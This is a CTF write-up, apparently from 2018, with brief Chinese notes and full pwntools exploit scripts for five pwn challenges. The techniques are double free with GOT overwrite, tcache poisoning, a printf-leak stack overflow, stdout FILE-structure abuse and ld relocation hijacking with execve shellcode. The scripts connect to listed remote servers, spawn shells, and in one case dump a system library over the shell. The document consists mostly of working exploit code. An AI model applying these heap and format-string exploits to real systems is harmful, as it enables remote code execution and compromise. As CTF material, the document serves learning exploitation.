### easiest
double free 改got 表

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./easiest"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("39.96.9.148",9999)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

def add(idx,size,con):
    r.sendlineafter("delete \n","1".ljust(0x2f,"\x00"))
    r.sendlineafter("(0-11):",str(idx))
    r.sendlineafter("Length:",str(size))
    if len(con) == size:
        r.sendafter("C:",con)
    else:
        r.sendlineafter("C:",con)

def dele(idx):
    r.sendlineafter("delete \n","2".ljust(0x2f,"\x00"))
    r.sendlineafter("(0-11)",str(idx))

add(0,0x30,"a"*0x30)
add(1,0x30,"a"*0x30)
add(2,0x30,"a"*0x30)
dele(0)
dele(1)
dele(0)
add(0,0x30,p64(0x60203a))
add(0,0x30,"a")
add(0,0x30,"a")
add(0,0x30,"a"*0x16+p64(elf.sym["system"]))
r.sendline("/bin/sh".ljust(0x2f,"\x00"))
r.interactive()
```

### atum
利用tcache实现任意内存写，通过堆地址来爆bss地址，概率大概是1/512 ？  
然后修改note指针，泄露libc改free hook

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./houseofAtum"
os.environ = {"LD_LIBRARY_PATH":"./"}
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
context.log_level = "error"
heap_add=0
stack_add=0
r=None
def get_cc():
    global r
    if len(sys.argv)==1:
        r=process(pwn_file)
    else:
        r=remote("60.205.224.216",9999)

def debug():
    log.debug("stack add:0x%x"%stack_add)
    log.debug("pie add:0x%x"%elf.address)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(con):
    global r
    r.sendlineafter("choice:","1\x00")
    r.sendafter("content:",con)

def dele(idx,delete= False):
    global r
    r.sendlineafter("choice:","3\x00")
    r.sendlineafter("idx:",str(idx))
    r.sendlineafter("Clear?(y/n):","y" if delete else "n")

def show(idx):
    global r
    r.sendlineafter("choice:","4\x00")
    r.sendlineafter("idx:",str(idx))
    r.recvuntil("Content:")
    return r.recvline()[:-1]

def edit(idx,cont):
    global r
    r.sendlineafter("choice:","2\x00")
    r.sendlineafter("idx:",str(idx))
    r.sendafter("content:",cont)

cnt = 0
while True:
    print cnt
    cnt+=1
    try:
        get_cc()
        add(p64(0x91)*9)
        add(p64(0x91)*9)
        dele(1)
        dele(0)
        heap_add = u64(show(0).ljust(8,"\x00"))>>12<<12
        for i in range(5):
            dele(0)
        elf.address = heap_add - 0x1481000
        edit(0,p64(heap_add+0x260)+"\x00"*56+p64(elf.address+0x202050))
        dele(1,True)
        dele(0,True)
        add("\x00"*0x30+p64(heap_add+0x3000)+p64(0x91))
        add("b")
        dele(1,True)
        add(p64(elf.got["puts"]))
        r.recvuntil("Your")
        libc.address = 0
        libc.address = u64(show(0).ljust(8,"\x00")) - libc.sym["puts"]
        break
    except Exception as e:
        r.close()
#        raise e

context.log_level = "debug"


edit(1,p64(next(libc.search("/bin/sh")))+p64(libc.sym["__free_hook"]))
edit(1,p64(libc.sym["system"]))

r.sendlineafter("choice:","3")
r.sendlineafter("idx:","0")

r.interactive()

```

### hardcore
前几天的hctf刚出过类似的题。printf的`%a`可以leak出libc地址，然后泄露cookie，接下来就是正常的栈溢出。

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./hardcore_fmt"
elf=ELF(pwn_file)
os.environ = {"LD_LIBRARY_PATH":"./"}
libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
def get_cc():
    if len(sys.argv)==1:
        r=remote("127.1",60001)
        pid = 0 
    else:
        r=remote("39.106.110.69",9999)
        pid=0
    return r

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

for off in range(0x2c00,0x8000,0x100):
    r = get_cc()
    r.sendlineafter("fmt\n","%a"*5)
    r.recvuntil("10220x0.0")
    add = int(r.recvuntil("p")[:-1]+"00",16)
    print hex(add)
    log.info("offset :0x%x"%off)
    cookie_add = add - off + 0x29
    try:
        r.sendline(str(cookie_add))
        r.recvuntil(": ")
        data = r.recv(7,timeout = 0.5)
        if data == "":
            r.close()
            continue
        cookie = "\x00" + data
        break
    except  Exception as e:
        r.close()

libc.address =add - 0x61a100
f={
    0x108:cookie,
    0x128:p64(libc.address+0x4f322),
}
r.sendline(fit(f,filler="\x00",length=0x200))
r.interactive()

```
### three  
感觉做法不是正解。。。  
构造出unsort bin，将tcache指向libc的一处偏移，部分覆盖libc偏移，将它指向stdout结构体，修改flag 标志和 write base ptr，leak出libc地址。进行到这一步本来以为这道题快结束了，想着利用unsort bin attack ，但是2.27的libc在 libc error msg里好像并没有调用`_IO_flush_all `函数。  
并且由于只能申请3个堆块，构造的double free刚好没办法利用。最后还是利用stdout结构体，将栈地址，elf地址依次leak出来，再将stdout的write base指向notes数组附近，利用stdout 的buffer部分覆盖notes[0]的低字节，将其改小。用notes[0]修改notes[1]的堆size，这样free的时候进不了0x50的tcache，进而实现任意内存分配。  

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./three"
os.environ = {"LD_LIBRARY_PATH":"./"}
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
heap_add=0
stack_add=0
r=None
def get_cc():
    global r
    if len(sys.argv)==1:
        r=process(pwn_file)
        pid=r.pid
    else:
        r=remote("39.96.13.122",9999)
        pid=0


def debug():
    log.debug("process pid:%d"%pid)
    log.debug("stack add:0x%x"%stack_add)
    log.debug("pie add:0x%x"%elf.address)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(con):
    global r
    r.sendafter("choice:","1")
    r.sendafter("content:",con)

def dele(idx,delete= False):
    global r
    r.sendlineafter("choice:","3")
    r.sendlineafter("idx:",str(idx))
    r.sendlineafter("Clear?(y/n):","y" if delete else "n")

def edit(idx,cont):
    global r
    r.sendlineafter("choice:","2")
    r.sendlineafter("idx:",str(idx))
    r.sendafter("content:",cont)

while True:
    try:
        get_cc()
        add(p64(0x91)*2+p64(0)+p64(0x91)*5)
        add(p64(0x91)*8)
        add(p64(0x21)*8)

        dele(1,True)
        dele(2,True)
        dele(0)
        dele(0)
        edit(0,"\x70")
        add("a")
        add("a")
        for i in range(7):
            dele(2)
        dele(2,True)

        dele(1,True)
        dele(0)
        edit(0,"\x70")
        add("a"*0x8+p64(0x31)+"\x60\x37")
        add("\xa0")
        dele(2,True)

        add(p64(0xfbad3c80)+p64(0)*3+"\x00")
        libc.address = u64(r.recv(16)[8:]) - 0x3b18b0 - 0x3c000
        break
    except Exception as e:
        r.close()

dele(0,True)
dele(1,True)

#add(p64(0xdeadbeef)+ p64(0x61)+p64(0)+p64(libc.sym["_IO_2_1_stdout_"]+0x88-0x30))
edit(2,p64(0xfbad3c80)+p64(libc.sym["environ"])*4+p64(libc.sym["environ"]+0x100)*3)
stack_add = u64(r.recv(8))

r.sendline("2")
r.sendline("2")
sleep(0.5)
r.send(p64(0xfbad3c80)+p64(stack_add)*4+p64(stack_add+0x108)*3)
r.recvuntil(p64(0x0000000000000003))
elf.address = u64(r.recv(8))-0x40

r.sendline("1")
r.sendline(p64(libc.sym["__malloc_hook"]))

r.sendline("2")
r.sendline("2")
sleep(0.5)
r.send(p64(0x00000000fbad2887)+p64(elf.address+0x202050)*7)

r.sendline("2")
r.sendline("2")
sleep(0.5)
r.send(p64(0xfbad2887)+p64(elf.address+0x202a00)*7)

edit(0,"\x00"*6+"\x00"*0x18+p64(0x41)+p64(libc.sym["__free_hook"]))
add("a")
dele(1,True)

add(p64(libc.sym["system"]))
edit(2,"/bin/sh\x00")
r.sendline("3")
r.sendline("2")
r.clean()
r.sendline("cat /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")
f = open("ld","w+")
while True:
    data = r.recv(1024,timeout = 1)
    if data == "":
        break
    f.write(data)

f.close()

r.interactive()

```

### easysandbox

baby hitcon?  
利用ld的`_dl_relocate_object`实现任意内存写，在进`_start`函数之前劫持程序控制流

make.py  

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from elf import *
from pwn import *
import sys
const={
    "JUMP_SLOT":7,
    "COPY":5,
    "SYM":6,
    "FAIL":0x25,
}
code=Elf("./main")
for i in range(len(code.phdrs)):
    code.phdrs[i].p_flags=0x7
code.save("./main")


def rela(r_offset,type,symbol,r_addend):
    return p64(r_offset)+p32(const[type])+p32(symbol)+p64(r_addend)
def sym(name,info,shndx,value,size):
    return p32(name)+p8(info)+p8(shndx)+p16(value)+p64(size)

pool=[]
cnt=1
base_func="free"
def write(dis,value,libc_d=True):
    global pool
    global cnt
    dis-=libc.sym[base_func]
    if libc_d:
        value-=libc.sym[base_func]
    tmp1=rela(rela_base+0x18*cnt,"JUMP_SLOT",2,0xffffffffffffffff&dis)
    tmp2=rela(0xdeadbeef,"JUMP_SLOT",2 if libc_d else 0,0xffffffffffffffff&value)
    pool.append(tmp1)
    pool.append(tmp2)
    cnt+=2

libc_ld_dis = 0x5f3000
libc=ELF("./libc.so.6")
sym_idx=5
jmp_idx=10
rela_idx=9
elf=ELF("./main")
rela_base=elf.sections[rela_idx]['sh_addr']

write(libc_ld_dis + 0x227000+ 0x2170,0x4009e0,libc_d = False)
tmp=rela(0xdeadbeef,"FAIL",0x0,0)
pool.append(tmp)

for i in range(len(pool)):
    elf.write(rela_base+0x18*i,pool[i])

shellcode="""
    mov rax,SYS_execve
    call here
    .ascii "/bin/sh"
    .byte 0
here:
    pop rdi
    xor rsi,rsi
    xor rdx,rdx
    syscall
"""
shellcode=asm(shellcode,arch="amd64")
elf.write(0x4009e0,shellcode)
#elf.write(next(elf.search("/lib64/ld-linux-x86-64.so.2")),".//////ld-linux-x86-64.so.2")
elf.save()

```

main.c

```c
/*
 * main.c
 * Copyright (C) 2018 hzshang <hzshang15@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
int main(int argc, char *argv[]){
    printf("%p%p%p%p%p%p%p%p%p%p%p",alarm,system,
            printf,sleep,execve,exit,strdup,exit,malloc,free,calloc,puts
            ,read,write,close,mmap,fprintf,fopen,fclose,fscanf);
    return 0;
}

```
Makefile

```
.PHONY: all
all:
	gcc main.c -o main -z now
	strip main
	python make.py
```

